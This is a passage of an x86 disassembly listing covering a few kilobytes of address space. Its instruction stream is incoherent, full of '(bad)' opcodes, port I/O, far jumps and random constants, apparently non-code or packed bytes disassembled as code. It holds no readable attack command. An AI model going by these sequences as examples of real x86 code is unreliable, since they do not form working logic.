  422d2b:	mov    esp,0x6fe3b275
  422d30:	icebp  
  422d31:	fwait
  422d32:	cmc    
  422d33:	xchg   edx,eax
  422d34:	inc    edx
  422d35:	mov    ebp,0x6191d6fd
  422d3a:	mov    bl,0x74
  422d3c:	mov    bh,BYTE PTR [edi]
  422d3e:	imul   ecx,DWORD PTR ds:[edi-0x74289de1],0x3
  422d46:	adc    eax,0xe8ab0d2f
  422d4b:	cmc    
  422d4c:	pop    esp
  422d4d:	pusha  
  422d4e:	jmp    0x422d30
  422d50:	pusha  
  422d51:	std    
  422d52:	or     bh,BYTE PTR [ebx-0x2acc400e]
  422d58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d59:	push   edx
  422d5a:	inc    ebx
  422d5b:	mov    edx,0x583cdec2
  422d60:	mov    ds,WORD PTR [ebp+ebx*2-0x74]
  422d64:	inc    edx
  422d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d66:	mov    eax,0x6339b3d
  422d6b:	ins    BYTE PTR es:[edi],dx
  422d6c:	push   esp
  422d6d:	inc    ebp
  422d6e:	outs   dx,DWORD PTR ds:[esi]
  422d6f:	sbb    dl,al
  422d71:	icebp  
  422d72:	pop    ecx
  422d73:	mov    edx,DWORD PTR [ebx-0x47]
  422d76:	sub    edi,DWORD PTR [ebx]
  422d78:	or     esp,esp
  422d7a:	shl    esi,1
  422d7c:	jbe    0x422d71
  422d7e:	jl     0x422dd7
  422d80:	shl    BYTE PTR [ebx-0x5c],0x69
  422d84:	add    DWORD PTR [esi+0x15a49489],0x461f7a52
  422d8e:	push   esp
  422d8f:	adc    al,BYTE PTR [ecx+0x31]
  422d92:	or     dl,dl
  422d94:	mov    dl,0x14
  422d96:	mov    bh,BYTE PTR [edx+0x44]
  422d99:	out    dx,eax
  422d9a:	je     0x422d7a
  422d9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d9d:	ins    DWORD PTR es:[edi],dx
  422d9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d9f:	lea    esi,[ecx]
  422da1:	mov    ebx,0x9a045232
  422da6:	sti    
  422da7:	mov    ds:0x4ee0d5cc,eax
  422dac:	bound  edi,QWORD PTR [ebx+0x58eeee6e]
  422db2:	outs   dx,BYTE PTR ds:[esi]
  422db3:	sub    esp,DWORD PTR [edx+0x78666479]
  422db9:	add    esi,DWORD PTR [ecx-0x30d3d7b1]
  422dbf:	into   
  422dc0:	adc    eax,0x3dbf9b42
  422dc5:	ins    DWORD PTR es:[edi],dx
  422dc6:	loop   0x422d48
  422dc8:	fbstp  TBYTE PTR [edi+0x515e9894]
  422dce:	mov    eax,0x16b2d352
  422dd3:	adc    al,0x58
  422dd5:	test   BYTE PTR [ebx],bl
  422dd7:	jne    0x422dc1
  422dd9:	cs push ss
  422ddb:	stos   DWORD PTR es:[edi],eax
  422ddc:	call   0xaa8bca4c
  422de1:	jb     0x422ddc
  422de3:	ja     0x422df6
  422de5:	adc    BYTE PTR [ebx+edx*1-0x5e511c69],bh
  422dec:	dec    edi
  422ded:	xchg   edi,eax
  422dee:	shr    DWORD PTR [ebx-0x6fe3f85b],1
  422df4:	aas    
  422df5:	adc    eax,0x1effb751
  422dfa:	cmp    DWORD PTR [ebx+ebp*2+0x21],eax
  422dfe:	inc    eax
  422dff:	inc    eax
  422e00:	add    bh,BYTE PTR ds:0xcea95a14
  422e06:	gs push edi
  422e08:	mov    edi,0xff95562e
  422e0d:	and    dl,BYTE PTR [eax]
  422e0f:	or     BYTE PTR [edi],0xf8
  422e12:	ins    DWORD PTR es:[edi],dx
  422e13:	push   esi
  422e14:	(bad)  
  422e15:	pop    esp
  422e16:	cmc    
  422e17:	push   es
  422e18:	loope  0x422e4f
  422e1a:	add    cl,BYTE PTR [edi-0x26]
  422e1d:	pop    ecx
  422e1e:	dec    edx
  422e1f:	adc    ch,ah
  422e21:	mov    edi,0x631ca959
  422e26:	in     al,dx
  422e27:	popa   
  422e28:	sub    al,0x36
  422e2a:	dec    esp
  422e2b:	imul   edx,DWORD PTR [ebp-0x49],0x7d
  422e2f:	add    bh,bl
  422e31:	sbb    DWORD PTR [edi],edi
  422e33:	and    dl,BYTE PTR [ebx+ecx*1-0x3848778c]
  422e3a:	inc    eax
  422e3b:	fcomp  QWORD PTR [ebp+0x52cd48c4]
  422e41:	adc    al,0x79
  422e43:	xor    BYTE PTR [edi-0x5b],cl
  422e46:	add    DWORD PTR [ebx-0x4ad788a],esi
  422e4c:	(bad)
  422e50:	xor    eax,0x11bf0a94
  422e55:	xchg   ecx,eax
  422e56:	shl    DWORD PTR [edi],cl
  422e58:	pop    edx
  422e59:	or     DWORD PTR [edx+0x7e],0xffffffcb
  422e5d:	mov    cl,0xc4
  422e5f:	mov    BYTE PTR [ecx-0x69],dl
  422e62:	sub    al,0xc4
  422e64:	leave  
  422e65:	push   ebx
  422e66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e67:	ja     0x422e1c
  422e69:	xchg   edx,eax
  422e6a:	cld    
  422e6b:	aaa    
  422e6c:	mov    ch,0x13
  422e6e:	ret    
  422e6f:	ficomp DWORD PTR [edi+eax*1-0x1a]
  422e73:	enter  0x780f,0xe7
  422e77:	cli    
  422e78:	outs   dx,BYTE PTR ds:[esi]
  422e79:	out    0xf4,al
  422e7b:	mov    edx,esp
  422e7d:	mov    WORD PTR [ebx+0x58d68d07],?
  422e83:	sbb    edx,DWORD PTR [eax+0x71]
  422e86:	push   esp
  422e87:	test   al,0x30
  422e89:	ds push esi
  422e8b:	jns    0x422ee4
  422e8d:	cmp    edx,DWORD PTR [ecx]
  422e8f:	xchg   esi,eax
  422e90:	cld    
  422e91:	add    DWORD PTR [ebx+0x555d215f],ebx
  422e97:	sete   BYTE PTR [ebp-0x2a]
  422e9b:	sbb    al,0xe7
  422e9d:	or     eax,0x80b75cf5
  422ea2:	jmp    0x9188:0xb56f7be4
  422ea9:	mov    ch,0xf7
  422eab:	cmp    DWORD PTR [ebx+0x3a9fed32],esi
  422eb1:	or     al,0xb2
  422eb3:	mov    esp,0xa9c67e5c
  422eb8:	sub    esi,DWORD PTR [esp+eax*4]
  422ebb:	jge    0x422eab
  422ebd:	mov    ds:0x2a13b64d,al
  422ec2:	adc    eax,0x19e44197
  422ec7:	bnd jbe 0x422e91
  422eca:	or     BYTE PTR cs:[ebx],al
  422ecd:	es dec ebx
  422ecf:	pushf  
  422ed0:	pop    edi
  422ed1:	ret    
  422ed2:	inc    ebp
  422ed3:	xstore-rng (bad)
  422ed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ed5:	add    dh,BYTE PTR [ecx]
  422ed7:	shl    DWORD PTR [edi+0x27],cl
  422eda:	int    0xa
  422edc:	pop    ds
  422edd:	shl    BYTE PTR [edi+0x403adb22],0x99
  422ee4:	not    DWORD PTR [ebx]
  422ee6:	add    DWORD PTR [esi],ebx
  422ee8:	pop    edi
  422ee9:	imul   edx,esi,0x1e6964eb
  422eef:	mov    WORD PTR [ebx-0x489706b0],ss
  422ef5:	rcl    BYTE PTR [ebp-0x761b98a6],cl
  422efb:	dec    edi
  422efc:	in     eax,dx
  422efd:	hlt    
  422efe:	sub    BYTE PTR [edx-0x6a25d52c],bh
  422f04:	in     eax,0x5d
  422f06:	push   cs
  422f07:	arpl   WORD PTR [ebx],bx
  422f09:	mov    al,ds:0x15f074f7
  422f0e:	mov    dl,0xc8
  422f10:	das    
  422f11:	mov    cl,0x63
  422f13:	scas   al,BYTE PTR es:[edi]
  422f14:	ficomp DWORD PTR [edi+0x36]
  422f17:	xor    DWORD PTR [esi],edx
  422f19:	clc    
  422f1a:	shl    BYTE PTR [esi+0x3f7c05c1],cl
  422f20:	add    DWORD PTR [esi],esi
  422f22:	aaa    
  422f23:	adc    bh,BYTE PTR [ecx+edi*1+0x3c4f20c1]
  422f2a:	pop    edi
  422f2b:	inc    esi
  422f2c:	fild   WORD PTR [ecx+eax*8+0x32]
  422f30:	xor    DWORD PTR [edx-0x76ca816],esi
  422f36:	frstor [ebp-0x4b]
  422f39:	call   0xa1a0:0xe81fe5a3
  422f40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f41:	cld    
  422f42:	imul   ecx,DWORD PTR [edi+edi*4-0x36241261],0xecad235
  422f4d:	adc    BYTE PTR [edi+0x44],dl
  422f50:	or     eax,0x3a99b719
  422f55:	lock xchg BYTE PTR fs:[esi+0x4559ec97],dl
  422f5d:	out    0x3b,al
  422f5f:	cmp    ch,ch
  422f61:	push   esp
  422f62:	sub    al,0x7e
  422f64:	adc    al,0x72
  422f66:	or     al,0x14
  422f68:	sub    eax,0x6275b77f
  422f6d:	mov    WORD PTR [esp+esi*2-0x48aa812b],gs
  422f74:	fild   DWORD PTR [ebx+0x3a4644f2]
  422f7a:	lock ins DWORD PTR es:[edi],dx
  422f7c:	dec    ecx
  422f7d:	pop    es
  422f7e:	mov    ebp,0x15b32ca4
  422f83:	pop    es
  422f84:	xchg   ecx,eax
  422f85:	mov    bh,0xc2
  422f87:	jns    0x422f2c
  422f89:	cmp    dl,BYTE PTR [edi+0x73221c50]
  422f8f:	mov    edx,0x2a0fe6af
  422f94:	or     edx,edi
  422f96:	xchg   ecx,eax
  422f97:	(bad)  
  422f98:	cs js  0x422f4f
  422f9b:	mov    cl,BYTE PTR [edi+eax*4+0x713ba0d1]
  422fa2:	cmp    DWORD PTR [eax+0x40],ebx
  422fa5:	sbb    esp,esi
  422fa7:	popa   
  422fa8:	add    ecx,edx
  422faa:	mov    bl,0x28
  422fac:	jns    0x423019
  422fae:	das    
  422faf:	sub    ch,al
  422fb1:	retf   0x7268
  422fb4:	outs   dx,DWORD PTR ds:[esi]
  422fb5:	mov    eax,0x8dfeef1a
  422fba:	add    eax,0xd8a00305
  422fbf:	in     eax,0xeb
  422fc1:	stc    
  422fc2:	aam    0x81
  422fc4:	mov    WORD PTR [eax-0x59],ss
  422fc7:	cmc    
  422fc8:	leave  
  422fc9:	xor    eax,0x5db08904
  422fce:	xchg   esp,eax
  422fcf:	pop    ebx
  422fd0:	push   0xffffff87
  422fd2:	adc    BYTE PTR [ebx+0x73],0x6a
  422fd6:	mov    esi,0x64439088
  422fdb:	add    BYTE PTR [edi+ebp*2+0x60051b26],cl
	...
  422fea:	push   eax
  422feb:	dec    esi
  422fec:	dec    edi
  422fed:	push   esi
  422fee:	pop    edi
  422fef:	push   edi
  422ff0:	pop    ecx
  422ff1:	dec    esi
  422ff2:	idiv   BYTE PTR [ebx+0x53]
  422ff5:	jns    0x422ffc
  422ff7:	in     eax,dx
  422ff8:	push   edx
  422ff9:	add    DWORD PTR [eax-0x42],edx
  422ffc:	add    DWORD PTR [eax],eax
  422ffe:	add    BYTE PTR [esi],0x0
  423001:	add    BYTE PTR [esi+0xe],bl
  423004:	sub    bh,BYTE PTR ds:0x5bc6d72e
  42300a:	lods   al,BYTE PTR ds:[esi]
  42300b:	sbb    ebx,ebp
  42300d:	call   0x393b:0xabd3529c
  423014:	mov    gs,WORD PTR [edx+0x1efa92c2]
  42301a:	jmp    0xc3e:0xc2a2b869
  423021:	jne    0x42302d
  423023:	retf   
  423024:	lods   eax,DWORD PTR ds:[esi]
  423025:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423026:	sub    DWORD PTR [esi*8+0x59e11b3e],ecx
  42302d:	ins    BYTE PTR es:[edi],dx
  42302e:	mov    dh,0xce
  423030:	cmp    eax,0x67aae3c9
  423035:	stc    
  423036:	outs   dx,BYTE PTR ds:[esi]
  423037:	mov    al,ds:0x842cffbc
  42303c:	push   esi
  42303d:	sti    
  42303e:	pop    ecx
  42303f:	inc    ebp
  423040:	(bad)  
  423042:	lds    ecx,FWORD PTR [ecx-0x62]
  423045:	push   ecx
  423047:	loope  0x423093
  423049:	mov    esp,0x98f992ea
  42304e:	out    dx,al
  42304f:	mov    edi,0xa411a110
  423054:	fcomp  QWORD PTR [ebp+0x3a]
  423057:	xchg   ebp,eax
  423058:	add    ecx,DWORD PTR [esi+0x715cbf05]
  42305e:	jbe    0x4230c6
  423060:	jecxz  0x422ffb
  423062:	jle    0x42306e
  423064:	dec    edi
  423065:	les    ebp,FWORD PTR ds:0x79cf87ee
  42306b:	icebp  
  42306c:	mov    bl,0xd6
  42306e:	sbb    eax,DWORD PTR [esi]
  423070:	jns    0x423010
  423072:	call   0xc7b3f3a4
  423077:	popf   
  423078:	pushf  
  423079:	mov    ch,0x58
  42307b:	fld    DWORD PTR ds:0x4cac61ca
  423081:	out    dx,al
  423082:	push   ebp
  423083:	add    ecx,DWORD PTR [ecx+0x33]
  423086:	mov    ebp,0x1370bdde
  42308b:	sub    bh,BYTE PTR [eax]
  42308d:	adc    al,0x57
  42308f:	lock dec esp
  423091:	adc    al,0x21
  423093:	call   0x10f609b8
  423098:	xchg   esi,eax
  423099:	fs xor eax,0x78067fc4
  42309f:	mov    esi,0xd6b6470
  4230a4:	adc    BYTE PTR [ebx],ah
  4230a6:	sti    
  4230a7:	and    bh,cl
  4230a9:	fisubr DWORD PTR [esi-0x673240fa]
  4230af:	jnp    0x423032
  4230b1:	xchg   ebp,eax
  4230b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230b3:	cmp    eax,0x205a5b96
  4230b8:	cli    
  4230b9:	xchg   esi,eax
  4230ba:	lahf   
  4230bb:	ret    0x53d2
  4230be:	popa   
  4230bf:	xor    BYTE PTR [edx-0x20c0c85],0xac
  4230c6:	push   0x553eeb9f
  4230cb:	dec    eax
  4230cc:	fcmovnb st,st(4)
  4230ce:	lods   al,BYTE PTR ds:[esi]
  4230cf:	jl     0x4230f2
  4230d1:	push   esi
  4230d2:	mov    ds:0x6325e5f1,al
  4230d7:	xor    eax,0x41304243
  4230dc:	mov    al,0xa0
  4230de:	inc    esp
  4230df:	pop    ecx
  4230e0:	or     al,0x59
  4230e2:	aas    
  4230e3:	push   esi
  4230e4:	jmp    0x42308f
  4230e6:	ss icebp 
  4230e8:	sbb    BYTE PTR [ecx+ebp*8+0x5a],0xd7
  4230ed:	(bad)  
  4230ee:	aam    0x45
  4230f0:	mov    dh,0xbc
  4230f2:	xor    bh,BYTE PTR [eax]
  4230f4:	popa   
  4230f5:	test   BYTE PTR ss:[eax+edx*2],dl
  4230f9:	sbb    al,0x96
  4230fb:	out    0x66,eax
  4230fd:	loope  0x423087
  4230ff:	arpl   dx,di
  423101:	adc    edx,edx
  423103:	fwait
  423104:	stc    
  423105:	sbb    al,0x39
  423107:	add    edi,DWORD PTR [edx-0x78b7ccb1]
  42310d:	sbb    bh,0x9e
  423110:	out    0x1,eax
  423112:	sbb    ah,BYTE PTR [esi]
  423114:	scas   eax,DWORD PTR es:[edi]
  423115:	push   esi
  423116:	pop    esp
  423117:	xchg   ecx,eax
  423118:	jne    0x42316b
  42311a:	repz mov esi,0xfb32a593
  423120:	test   al,0xc5
  423122:	ja     0x4230a5
  423124:	pusha  
  423125:	jmp    0x4230e9
  423127:	out    dx,al
  423128:	push   eax
  423129:	push   cs
  42312a:	mov    dl,0xfd
  42312c:	and    ecx,eax
  42312e:	push   edi
  42312f:	push   eax
  423130:	mov    ecx,DWORD PTR [edi-0x3e261dc6]
  423136:	dec    ecx
  423137:	imul   esi
  423139:	dec    ecx
  42313a:	imul   ecx,DWORD PTR es:[eax-0x577ff461],0xffffffdc
  423142:	add    al,BYTE PTR [ecx+0x49]
  423145:	scas   al,BYTE PTR es:[edi]
  423146:	and    BYTE PTR [edx],dl
  423148:	cmp    eax,0xfe6bd282
  42314d:	outs   dx,BYTE PTR ds:[esi]
  42314e:	dec    ecx
  42314f:	dec    ebx
  423150:	jb     0x4230ff
  423152:	add    edx,edi
  423154:	add    esp,edi
  423156:	mov    bh,0xaf
  423158:	xor    BYTE PTR [esi],0x70
  42315b:	jg     0x4231d4
  42315d:	push   eax
  42315e:	jbe    0x423134
  423160:	inc    esp
  423161:	lock clc 
  423163:	pop    ss
  423164:	or     dh,BYTE PTR [ebp+0x7f1dbc39]
  42316a:	fstp   TBYTE PTR [edx+edi*2]
  42316d:	in     al,0x54
  42316f:	imul   edi,DWORD PTR [ebp-0x1bfb4e60],0xffffffa0
  423176:	pop    esp
  423177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423178:	sbb    BYTE PTR [ebx],bh
  42317a:	pop    esi
  42317b:	pop    edx
  42317c:	mov    bl,0xa0
  42317e:	rol    BYTE PTR [ebx-0x5eccb3d5],cl
  423184:	shr    DWORD PTR [ebp+esi*1-0x9],0x7d
  423189:	mov    ds:0x9adf48d6,eax
  42318e:	xchg   esp,eax
  42318f:	call   0x5a927bbc
  423194:	nop
  423195:	icebp  
  423196:	sbb    edx,DWORD PTR [ebx+0x51661cfe]
  42319c:	add    DWORD PTR [esi+0x683e0eb8],ebx
  4231a2:	push   ebp
  4231a3:	and    esp,DWORD PTR [edx]
  4231a5:	pop    edx
  4231a6:	xor    esp,edi
  4231a8:	les    ebp,FWORD PTR [edi+0x55]
  4231ab:	xor    ebp,DWORD PTR [edx+0x55df1e4]
  4231b1:	loopne 0x42313c
  4231b3:	push   edx
  4231b4:	icebp  
  4231b5:	repz mov edx,0x8ac24f2f
  4231bb:	clc    
  4231bc:	xor    eax,0x53ad88f3
  4231c1:	and    BYTE PTR ss:[ebp+0x34],0x7b
  4231c6:	mov    bl,0x74
  4231c8:	pop    esi
  4231c9:	pop    edx
  4231ca:	inc    esp
  4231cb:	fst    QWORD PTR [eax+0x3df9cc96]
  4231d1:	aad    0xf6
  4231d3:	xchg   ecx,eax
  4231d4:	mov    edx,0xec7ccf4f
  4231d9:	cmp    BYTE PTR [edx+0x19],0x41
  4231dd:	int3   
  4231de:	mov    eax,0xb620dacb
  4231e3:	mov    esp,0x5908a38d
  4231e8:	cmp    eax,0x721b7535
  4231ed:	mov    ah,0x7e
  4231ef:	loop   0x42323b
  4231f1:	(bad)  
  4231f2:	mov    al,0x47
  4231f4:	push   esi
  4231f5:	add    dh,BYTE PTR [ebp-0x6079a5e0]
  4231fb:	(bad)  
  4231fc:	jecxz  0x42320b
  4231fe:	add    DWORD PTR [ebp+0x358c0823],0xc81bd81c
  423208:	sub    BYTE PTR [eax-0x59],ch
  42320b:	ins    DWORD PTR es:[edi],dx
  42320c:	dec    eax
  42320d:	(bad)  
  42320e:	outs   dx,DWORD PTR ds:[esi]
  42320f:	ror    ebp,cl
  423211:	pop    esp
  423212:	adc    DWORD PTR [ebx-0x6121b195],esi
  423218:	push   0x4b0a1b97
  42321d:	stos   BYTE PTR es:[edi],al
  42321e:	push   cs
  42321f:	ret    0xb4aa
  423222:	mov    ah,0x23
  423224:	mov    al,0xfc
  423226:	imul   BYTE PTR ss:[edi-0x3b9ada54]
  42322d:	aam    0x5b
  42322f:	ret    
  423230:	lds    edi,FWORD PTR ds:0xb4a48c6f
  423236:	mov    ch,0x47
  423238:	cdq    
  423239:	jne    0x423281
  42323b:	div    DWORD PTR [edx-0x33]
  42323e:	fist   WORD PTR [edi]
  423240:	sti    
  423241:	sub    al,0xda
  423243:	outs   dx,DWORD PTR ds:[esi]
  423244:	pop    ds
  423245:	lods   eax,DWORD PTR ds:[esi]
  423246:	jp     0x4231f5
  423248:	in     al,0x2d
  42324a:	clc    
  42324b:	bound  edx,QWORD PTR [ebp-0x724dfb6c]
  423251:	int3   
  423252:	popf   
  423253:	cdq    
  423254:	mov    eax,0x69a71ee7
  423259:	cmp    al,0x1d
  42325b:	mov    esp,edi
  42325d:	xchg   edx,eax
  42325e:	loope  0x42328c
  423260:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423262:	mov    ch,BYTE PTR [edx+edx*8+0x1a704879]
  423269:	rcl    BYTE PTR [esi-0x57],1
  42326c:	jbe    0x423255
  42326e:	ret    
  42326f:	inc    edx
  423270:	pop    esi
  423271:	stos   BYTE PTR es:[edi],al
  423272:	mov    dh,0xe2
  423274:	dec    edx
  423275:	fnstcw WORD PTR [ebx+0x1cdd537c]
  42327b:	sbb    al,BYTE PTR [edx+0x62]
  42327e:	pop    ebp
  42327f:	shl    BYTE PTR [esi+0x3b],1
  423282:	fidiv  WORD PTR [eax-0x20a3f21f]
  423288:	push   0xfffffffd
  42328a:	ins    DWORD PTR es:[edi],dx
  42328b:	mov    esp,ebx
  42328d:	icebp  
  42328e:	iret   
  42328f:	push   ebx
  423290:	popa   
  423291:	mov    esp,0x9073fef4
  423296:	or     eax,0xfa07a61e
  42329b:	pushf  
  42329c:	xlat   BYTE PTR ds:[ebx]
  42329d:	and    eax,0x3ba30180
  4232a2:	std    
  4232a3:	outs   dx,BYTE PTR ds:[esi]
  4232a4:	xchg   ebp,eax
  4232a5:	mov    ebx,0x597730a9
  4232aa:	xchg   BYTE PTR ss:[ebx],dh
  4232ad:	loope  0x42325f
  4232af:	daa    
  4232b0:	and    eax,0x45990208
  4232b5:	dec    esi
  4232b6:	xchg   BYTE PTR [eax-0x2eaef916],bl
  4232bc:	and    eax,0x1c52ced8
  4232c1:	div    DWORD PTR [edi+edx*1-0x3100facf]
  4232c8:	gs inc edi
  4232ca:	cmp    bl,BYTE PTR ds:0x858d1b92
  4232d0:	push   0x872e5985
  4232d5:	add    edi,ebp
  4232d7:	xor    eax,DWORD PTR [ecx]
  4232d9:	push   ebp
  4232da:	mov    bh,0x75
  4232dc:	sahf   
  4232dd:	nop
  4232de:	cmp    BYTE PTR [eax-0x6a6fda82],dl
  4232e4:	push   0x32
  4232e6:	sbb    dh,BYTE PTR [ecx]
  4232e8:	test   esi,edi
  4232ea:	push   esi
  4232eb:	lods   eax,DWORD PTR ds:[esi]
  4232ec:	add    DWORD PTR [ecx+0x35eb8383],ebx
  4232f2:	add    DWORD PTR [edx],0x871f5423
  4232f8:	mov    ecx,0x63b2f72c
  4232fd:	lahf   
  4232fe:	hlt    
  4232ff:	jle    0x423304
  423301:	fwait
  423302:	adc    DWORD PTR [edi-0x1f],ecx
  423305:	sub    DWORD PTR [ecx+0x9338870],edx
  42330b:	bound  edx,QWORD PTR [esi]
  42330d:	sbb    ebx,DWORD PTR [edi+eiz*2]
  423310:	inc    esp
  423311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423312:	fild   DWORD PTR [ebx]
  423314:	cwde   
  423315:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423316:	fcmovbe st,st(7)
  423318:	adc    al,0xb9
  42331a:	inc    ebp
  42331b:	shr    BYTE PTR [ecx],0xb4
  42331e:	jmp    0x423359
  423320:	stos   BYTE PTR es:[edi],al
  423321:	mov    al,0x5b
  423323:	js     0x423357
  423325:	mov    eax,0x7410717c
  42332a:	iret   
  42332b:	mov    ss,WORD PTR [edx+0x69925670]
  423331:	ins    BYTE PTR es:[edi],dx
  423332:	and    esp,DWORD PTR ds:0x9bca00f2
  423338:	retf   0xe986
  42333b:	xchg   esi,eax
  42333c:	dec    edi
  42333d:	adc    ebx,DWORD PTR [edi]
  42333f:	ret    
  423340:	nop
  423341:	pop    ebp
  423342:	push   cs
  423343:	ins    DWORD PTR es:[edi],dx
  423344:	aad    0x96
  423346:	in     eax,0x16
  423348:	xor    al,0x1b
  42334a:	or     ah,0x74
  42334d:	pop    ds
  42334e:	xchg   edi,eax
  42334f:	push   ss
  423350:	cmp    ah,cl
  423352:	jae    0x423383
  423354:	sub    dh,BYTE PTR [ebx-0x4a3ceea]
  42335a:	pusha  
  42335b:	(bad)  
  42335c:	mov    edi,0xe10a1bfd
  423361:	push   ecx
  423362:	jo     0x423384
  423364:	mov    ecx,0x562bc6f2
  423369:	(bad)
  42336e:	mov    ebx,DWORD PTR [ecx-0x278bac80]
  423374:	dec    esi
  423375:	fbld   TBYTE PTR [edx-0x2601cee3]
  42337b:	in     eax,dx
  42337c:	sub    DWORD PTR [edx+0x5676a354],edi
  423382:	into   
  423383:	dec    esi
  423384:	sbb    DWORD PTR [edx+0x4a],esi
  423387:	or     al,0xd
  423389:	xor    ah,BYTE PTR [edx+eax*1-0x5b]
  42338d:	sbb    ah,bl
  42338f:	dec    ebx
  423390:	shl    DWORD PTR [edi+0x6f],1
  423393:	mov    cl,0xa8
  423395:	shl    BYTE PTR [esi+0x2d],1
  423398:	jmp    0xfd18be95
  42339d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42339e:	pop    edi
  42339f:	xor    al,0xa5
  4233a1:	pop    ebp
  4233a2:	xor    edi,ebx
  4233a4:	(bad)  
  4233a5:	xor    al,0x26
  4233a7:	inc    esp
  4233a8:	mov    eax,0x51f516ba
  4233ad:	push   eax
  4233ae:	icebp  
  4233af:	sbb    bl,cl
  4233b1:	and    esp,DWORD PTR [edx]
  4233b3:	sar    BYTE PTR [edx+esi*8],0x1a
  4233b7:	push   0xffffffd3
  4233b9:	jnp    0x423340
  4233bb:	jge    0x423361
  4233bd:	cmc    
  4233be:	scas   al,BYTE PTR es:[edi]
  4233bf:	sub    edi,ebp
  4233c1:	fmulp  st(6),st
  4233c3:	scas   al,BYTE PTR es:[edi]
  4233c4:	inc    ebp
  4233c5:	jbe    0x4233d7
  4233c7:	jle    0x42336a
  4233c9:	out    0x22,al
  4233cb:	mov    ebp,0xdceeba61
  4233d0:	(bad)  
  4233d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233d2:	mov    ds:0x92a5363f,al
  4233d7:	jle    0x4233ce
  4233d9:	mov    bh,0x63
  4233db:	enter  0x8673,0x57
  4233df:	jmp    0x42341d
  4233e1:	sbb    bh,BYTE PTR [ebx]
  4233e3:	lods   al,BYTE PTR ds:[esi]
  4233e4:	inc    edx
  4233e5:	sbb    eax,0x45316713
  4233ea:	pop    ss
  4233eb:	xchg   esp,eax
  4233ec:	sbb    BYTE PTR [edx+0x2df7dd71],0xd1
  4233f3:	std    
  4233f4:	add    DWORD PTR [edx],esi
  4233f6:	jae    0x423418
  4233f8:	nop
  4233f9:	pusha  
  4233fa:	and    eax,0x1a7423b0
  4233ff:	jecxz  0x423466
  423401:	add    eax,0x989cbbdf
  423406:	xor    bh,0x40
  423409:	jnp    0x4233c0
  42340b:	retf   0x1aaf
  42340e:	stos   BYTE PTR es:[edi],al
  42340f:	(bad)  
  423410:	or     DWORD PTR [ebx+0x0],edi
  423413:	fist   DWORD PTR [eax+eiz*1+0x5eda5c8f]
  42341a:	and    eax,0x6b6471f1
  42341f:	repnz sub esp,DWORD PTR [ebp-0x6c]
  423423:	adc    eax,0x9b23b85c
  423428:	add    BYTE PTR [ebx],dh
  42342a:	xchg   edx,eax
  42342b:	pusha  
  42342c:	cmp    eax,0x3a0e4748
  423431:	jge    0x4233f4
  423433:	gs cmc 
  423435:	dec    eax
  423436:	adc    DWORD PTR [esi+0x1d3c4051],0xffffff89
  42343d:	xchg   DWORD PTR ds:0x11bc6788,ebx
  423443:	(bad)  
  423444:	inc    esi
  423445:	mov    edi,0x141fb044
  42344a:	into   
  42344b:	cs push edi
  42344d:	in     eax,0xe5
  42344f:	in     al,0x74
  423451:	sti    
  423452:	aam    0x6e
  423454:	sbb    al,0x8a
  423456:	lods   eax,DWORD PTR ds:[esi]
  423457:	aaa    
  423458:	mov    bl,BYTE PTR [esi]
  42345a:	xor    al,0x44
  42345c:	outs   dx,BYTE PTR ds:[esi]
  42345d:	sbb    eax,0x5bb6f4ee
  423462:	and    ebx,DWORD PTR [edx+0xd]
  423465:	lahf   
  423466:	mov    DWORD PTR [ebp-0x22fe00ef],ebp
  42346c:	inc    edx
  42346d:	inc    ebx
  42346e:	sub    DWORD PTR [eax+0x7a],ecx
  423471:	push   ecx
  423472:	pusha  
  423473:	daa    
  423474:	ds pop ebp
  423476:	pop    edx
  423477:	or     eax,0x7afa93dd
  42347c:	or     DWORD PTR [edi+0x27],ecx
  42347f:	inc    edx
  423480:	mov    BYTE PTR [edi],0xb8
  423483:	and    bh,BYTE PTR [bx-0xca3]
  423488:	std    
  423489:	dec    esp
  42348a:	pop    esp
  42348b:	loop   0x4234a1
  42348d:	sbb    al,0xdc
  42348f:	mov    bh,0x53
  423491:	sub    al,0x57
  423493:	(bad)  
  423494:	inc    ecx
  423495:	scas   eax,DWORD PTR es:[edi]
  423496:	ja     0x42342b
  423498:	mov    ah,0xb
  42349a:	lds    edi,FWORD PTR [di-0x3a]
  42349e:	loope  0x4234ff
  4234a0:	stos   BYTE PTR es:[edi],al
  4234a1:	push   ebx
  4234a2:	pop    ebp
  4234a3:	lods   al,BYTE PTR ds:[esi]
  4234a4:	sti    
  4234a5:	dec    eax
  4234a6:	jae    0x42343d
  4234a8:	and    DWORD PTR [ecx-0x7ed0e884],esi
  4234ae:	sub    eax,0x40af6f4b
  4234b3:	ret    0x7d8f
  4234b6:	adc    DWORD PTR [eax+eiz*2+0x63cd3af9],ebx
  4234bd:	inc    esi
  4234be:	pusha  
  4234bf:	inc    ecx
  4234c0:	call   0xbb41:0x1b5e8c44
  4234c7:	sbb    BYTE PTR [eax-0x31cc3c95],0x68
  4234ce:	mov    ds,WORD PTR es:[eax-0xd7d1468]
  4234d5:	ret    0x9fcd
  4234d8:	mov    al,ds:0xa3d8ce66
  4234dd:	pusha  
  4234de:	mov    eax,0x29dc7a31
  4234e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234e4:	pop    edx
  4234e5:	out    0xa1,eax
  4234e7:	and    eax,0x8c4ed9ff
  4234ec:	xchg   esp,eax
  4234ed:	aad    0x60
  4234ef:	cmp    DWORD PTR [esi],esi
  4234f1:	mov    esi,ecx
  4234f3:	xor    DWORD PTR [esi+0x29],ecx
